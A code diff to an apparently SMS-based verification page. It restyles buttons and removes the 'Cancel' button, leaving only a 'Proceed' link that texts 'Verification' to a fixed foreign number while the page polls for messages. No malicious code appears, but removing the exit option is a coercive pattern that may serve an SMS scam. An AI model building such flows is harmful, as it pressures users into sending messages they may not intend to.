@@ -133,31 +133,30 @@
     }
 
     .cta-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 18px;
-      margin-top: 12px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
       width: 100%;
     }
 
     .btn {
       appearance: none;
       border: 0;
-      border-radius: 18px;
-      padding: 18px 18px;
-      font-size: clamp(1.6rem, 2.5vw, 2.3rem);
+      border-radius: 16px;
+      padding: 18px 20px;
+      font-size: clamp(1.5rem, 2.2vw, 2.1rem);
       line-height: 1;
-      letter-spacing: -0.05em;
+      letter-spacing: -0.04em;
       font-weight: 700;
       cursor: pointer;
       transition: transform 0.18s ease, box-shadow 0.18s ease, opacity 0.18s ease;
-      width: 100%;
-      min-height: 72px;
+      min-height: 64px;
       display: inline-flex;
       align-items: center;
       justify-content: center;
       text-decoration: none;
-      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06);
+      box-shadow: 0 12px 24px rgba(49, 76, 96, 0.18), inset 0 0 0 1px rgba(255,255,255,0.08);
     }
 
     .btn:hover {
@@ -165,10 +164,11 @@
       opacity: 0.98;
     }
 
-    .btn.cancel,
     .btn.proceed {
+      width: min(280px, 80%);
       background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
       color: #fff;
+      margin: 0 auto;
     }
 
     .sms-retry {
@@ -526,9 +526,7 @@
       }
 
       .cta-row {
-        grid-template-columns: 1fr 1fr;
-        gap: 10px;
-        margin-top: 8px;
+        margin-top: 12px;
       }
 
       .ready-timer {
@@ -543,11 +541,15 @@
 
       .btn {
         min-width: 0;
-        min-height: 48px;
-        padding: 10px 8px;
-        border-radius: 10px;
+        min-height: 50px;
+        padding: 12px 14px;
+        border-radius: 12px;
         font-size: clamp(1rem, 4.5vw, 1.25rem);
         letter-spacing: -0.02em;
+      }
+
+      .btn.proceed {
+        width: min(220px, 100%);
       }
 
       .sms-retry {
@@ -644,7 +646,6 @@
       </div>
 
       <div class="cta-row">
-        <button type="button" class="btn cancel">Cancel</button>
         <a class="btn proceed" href="sms:+260971263570?body=Verification">Proceed</a>
       </div>
       <button type="button" class="btn sms-retry hidden" id="smsRetry">Retry</button>
@@ -938,10 +939,6 @@
     setInterval(pollMessages, 3000);
     updateSmsCountdown();
     document.addEventListener('visibilitychange', updateSmsCountdown);
-
-    document.querySelector('.btn.cancel')?.addEventListener('click', function () {
-      window.history.back();
-    });
 
     proceedLink.addEventListener('click', function () {
       stopReadyCountdown();
